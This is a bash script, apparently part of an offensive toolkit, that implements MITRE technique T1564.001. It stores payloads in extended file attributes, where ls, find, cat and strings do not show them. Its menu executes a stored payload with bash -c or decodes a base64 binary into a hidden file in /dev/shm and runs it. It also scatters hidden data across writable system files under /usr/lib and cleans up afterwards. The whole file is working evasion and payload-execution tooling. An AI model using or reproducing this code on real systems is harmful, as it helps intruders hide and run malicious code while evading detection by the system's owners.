#!/bin/bash
# T1564.001 — Hide Artifacts: xattr Data Hiding
# Store payloads and data in extended file attributes (invisible to ls/find/cat)

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_xattr"
XATTR_PREFIX="user.d3m0n"

banner_xattr() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1564.001 — xattr Data Hiding               ║"
    echo "  ║   Store data in extended attributes            ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_xattr_support() {
    if ! command -v setfattr &>/dev/null || ! command -v getfattr &>/dev/null; then
        echo -e "${RED}[!] setfattr/getfattr not found. Install: apt install attr${NC}"
        return 1
    fi

    # Check if filesystem supports xattr
    local testfile="/tmp/.d3m0n_xattr_test"
    touch "$testfile" 2>/dev/null
    if ! setfattr -n user.test -v "test" "$testfile" 2>/dev/null; then
        echo -e "${RED}[!] Filesystem does not support user xattrs (check mount options)${NC}"
        rm -f "$testfile"
        return 1
    fi
    rm -f "$testfile"
    return 0
}

xattr_store() {
    echo -e "${CYAN}[*] Store payload in file's extended attributes${NC}"
    check_xattr_support || return

    read -p "  Target file (must exist): " TFILE
    [[ ! -f "$TFILE" ]] && { echo -e "${RED}[!] File not found${NC}"; return; }

    echo -e "  ${CYAN}[1]${NC} Store text/command"
    echo -e "  ${CYAN}[2]${NC} Store file content (base64-encoded)"
    echo -e "  ${CYAN}[3]${NC} Store from stdin"
    read -p "  Method [1]: " method
    method="${method:-1}"

    read -p "  Attribute name [payload]: " ANAME
    ANAME="${ANAME:-payload}"
    local FULL_ATTR="${XATTR_PREFIX}.${ANAME}"

    case "$method" in
        1)
            read -p "  Data to store: " DATA
            setfattr -n "$FULL_ATTR" -v "$DATA" "$TFILE" 2>/dev/null
            ;;
        2)
            read -p "  Source file to embed: " SRC
            [[ ! -f "$SRC" ]] && { echo -e "${RED}[!] Source not found${NC}"; return; }
            local B64
            B64=$(base64 -w0 "$SRC")
            # xattr has a size limit (~64KB on most FS), check size
            local sz=${#B64}
            if [[ $sz -gt 65000 ]]; then
                echo -e "${YELLOW}[!] Data is ${sz} bytes — splitting into chunks${NC}"
                local chunk=0
                while [[ -n "$B64" ]]; do
                    setfattr -n "${FULL_ATTR}.${chunk}" -v "${B64:0:60000}" "$TFILE" 2>/dev/null
                    B64="${B64:60000}"
                    chunk=$((chunk + 1))
                done
                # Store chunk count
                setfattr -n "${FULL_ATTR}.chunks" -v "$chunk" "$TFILE" 2>/dev/null
                echo -e "${GREEN}[+] Stored in ${chunk} chunks${NC}"
            else
                setfattr -n "$FULL_ATTR" -v "$B64" "$TFILE" 2>/dev/null
            fi
            ;;
        3)
            echo "  (Type data, Ctrl-D to finish)"
            local DATA
            DATA=$(cat)
            setfattr -n "$FULL_ATTR" -v "$DATA" "$TFILE" 2>/dev/null
            ;;
    esac

    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[+] Data stored in ${FULL_ATTR} on ${TFILE}${NC}"
        echo -e "${YELLOW}[*] Invisible to: ls, find, cat, strings${NC}"
        echo -e "${YELLOW}[*] Retrieve: getfattr -n ${FULL_ATTR} --only-values ${TFILE}${NC}"
    else
        echo -e "${RED}[!] Failed to store data${NC}"
    fi
}

xattr_retrieve() {
    echo -e "${CYAN}[*] Retrieve data from extended attributes${NC}"
    check_xattr_support || return

    read -p "  File to read from: " TFILE
    [[ ! -f "$TFILE" ]] && { echo -e "${RED}[!] File not found${NC}"; return; }

    # List all d3m0n xattrs
    local attrs
    attrs=$(getfattr -d -m "${XATTR_PREFIX}" "$TFILE" 2>/dev/null | grep "${XATTR_PREFIX}")

    if [[ -z "$attrs" ]]; then
        echo -e "${YELLOW}[!] No d3m0n xattrs found on ${TFILE}${NC}"
        return
    fi

    echo "  Available attributes:"
    echo "$attrs"
    echo ""

    read -p "  Attribute name to retrieve [payload]: " ANAME
    ANAME="${ANAME:-payload}"
    local FULL_ATTR="${XATTR_PREFIX}.${ANAME}"

    # Check for chunked data
    local chunks
    chunks=$(getfattr -n "${FULL_ATTR}.chunks" --only-values "$TFILE" 2>/dev/null)

    if [[ -n "$chunks" ]]; then
        echo -e "${CYAN}[*] Reassembling ${chunks} chunks...${NC}"
        local DATA=""
        for ((i=0; i<chunks; i++)); do
            DATA+=$(getfattr -n "${FULL_ATTR}.${i}" --only-values "$TFILE" 2>/dev/null)
        done
        echo "$DATA"
    else
        getfattr -n "$FULL_ATTR" --only-values "$TFILE" 2>/dev/null
    fi
    echo ""
}

xattr_execute() {
    echo -e "${CYAN}[*] Execute payload stored in xattr${NC}"
    check_xattr_support || return

    read -p "  File containing xattr payload: " TFILE
    [[ ! -f "$TFILE" ]] && { echo -e "${RED}[!] File not found${NC}"; return; }

    read -p "  Attribute name [payload]: " ANAME
    ANAME="${ANAME:-payload}"
    local FULL_ATTR="${XATTR_PREFIX}.${ANAME}"

    local DATA
    DATA=$(getfattr -n "$FULL_ATTR" --only-values "$TFILE" 2>/dev/null)
    [[ -z "$DATA" ]] && { echo -e "${RED}[!] Attribute not found${NC}"; return; }

    echo -e "  ${CYAN}[1]${NC} Execute as shell command"
    echo -e "  ${CYAN}[2]${NC} Decode base64 and execute as binary"
    echo -e "  ${CYAN}[3]${NC} Decode base64 and save to file"
    read -p "  Method [1]: " method
    method="${method:-1}"

    case "$method" in
        1)
            echo -e "${YELLOW}[*] Executing: ${DATA:0:80}...${NC}"
            bash -c "$DATA"
            ;;
        2)
            local TMPF="/dev/shm/.d3m0n_$(head -c4 /dev/urandom | xxd -p)"
            echo "$DATA" | base64 -d > "$TMPF" 2>/dev/null
            chmod 755 "$TMPF" 2>/dev/null
            "$TMPF"
            rm -f "$TMPF"
            ;;
        3)
            read -p "  Output file: " OUTF
            echo "$DATA" | base64 -d > "$OUTF" 2>/dev/null
            echo -e "${GREEN}[+] Saved: ${OUTF}${NC}"
            ;;
    esac
}

xattr_bulk_hide() {
    echo -e "${CYAN}[*] Bulk-hide data across multiple files${NC}"
    check_xattr_support || return

    read -p "  Data to hide: " DATA
    read -p "  Directory to spread across [/usr/lib]: " DIR
    DIR="${DIR:-/usr/lib}"
    read -p "  Number of files to use [10]: " COUNT
    COUNT="${COUNT:-10}"

    [[ ! -d "$DIR" ]] && { echo -e "${RED}[!] Directory not found${NC}"; return; }

    # Find suitable files
    local files
    files=$(find "$DIR" -maxdepth 2 -type f -writable 2>/dev/null | shuf | head -n "$COUNT")

    if [[ -z "$files" ]]; then
        echo -e "${RED}[!] No writable files found in ${DIR}${NC}"
        return
    fi

    # Split data across files
    local B64
    B64=$(echo -n "$DATA" | base64 -w0)
    local total=${#B64}
    local chunk_size=$(( (total + COUNT - 1) / COUNT ))

    local i=0
    local manifest=""
    while IFS= read -r f; do
        local piece="${B64:$((i * chunk_size)):$chunk_size}"
        [[ -z "$piece" ]] && break
        setfattr -n "${XATTR_PREFIX}.chunk_${i}" -v "$piece" "$f" 2>/dev/null
        manifest+="${f}:${i}\n"
        echo -e "  ${GREEN}[+] Chunk $i → ${f}${NC}"
        i=$((i + 1))
    done <<< "$files"

    # Store manifest in first file
    local first
    first=$(echo "$files" | head -1)
    setfattr -n "${XATTR_PREFIX}.manifest" -v "$(echo -e "$manifest" | base64 -w0)" "$first" 2>/dev/null

    echo -e "${GREEN}[+] Data spread across ${i} files${NC}"
    echo -e "${YELLOW}[*] Manifest in: ${first} (attr: ${XATTR_PREFIX}.manifest)${NC}"
}

xattr_list() {
    echo -e "${CYAN}[*] Scanning for d3m0n xattrs...${NC}"
    check_xattr_support || return

    read -p "  Directory to scan [/]: " DIR
    DIR="${DIR:-/}"
    read -p "  Max depth [3]: " DEPTH
    DEPTH="${DEPTH:-3}"

    local found=0
    find "$DIR" -maxdepth "$DEPTH" -type f 2>/dev/null | while IFS= read -r f; do
        local attrs
        attrs=$(getfattr -d -m "${XATTR_PREFIX}" "$f" 2>/dev/null | grep "${XATTR_PREFIX}")
        if [[ -n "$attrs" ]]; then
            echo -e "  ${GREEN}${f}${NC}"
            echo "$attrs" | sed 's/^/    /'
            found=$((found + 1))
        fi
    done

    [[ $found -eq 0 ]] && echo -e "${YELLOW}[!] No d3m0n xattrs found${NC}"
}

xattr_cleanup() {
    echo -e "${CYAN}[*] Removing all d3m0n xattrs...${NC}"
    check_xattr_support || return

    read -p "  Directory to clean [/]: " DIR
    DIR="${DIR:-/}"
    read -p "  Max depth [3]: " DEPTH
    DEPTH="${DEPTH:-3}"

    local removed=0
    find "$DIR" -maxdepth "$DEPTH" -type f 2>/dev/null | while IFS= read -r f; do
        local attrs
        attrs=$(getfattr -d -m "${XATTR_PREFIX}" "$f" 2>/dev/null | grep "^${XATTR_PREFIX}" | cut -d= -f1)
        for attr in $attrs; do
            setfattr -x "$attr" "$f" 2>/dev/null
            removed=$((removed + 1))
        done
    done

    echo -e "${GREEN}[+] Cleanup complete (removed ${removed} attributes)${NC}"
}

main() {
    banner_xattr

    echo -e "  ${CYAN}[1]${NC} Store payload in xattr"
    echo -e "  ${CYAN}[2]${NC} Retrieve data from xattr"
    echo -e "  ${CYAN}[3]${NC} Execute payload from xattr"
    echo -e "  ${CYAN}[4]${NC} Bulk-hide (spread data across files)"
    echo -e "  ${CYAN}[5]${NC} List all d3m0n xattrs"
    echo -e "  ${CYAN}[6]${NC} Cleanup"
    echo ""
    read -p "Choose [1-6]: " OPT

    case "$OPT" in
        1) xattr_store ;;
        2) xattr_retrieve ;;
        3) xattr_execute ;;
        4) xattr_bulk_hide ;;
        5) xattr_list ;;
        6) xattr_cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
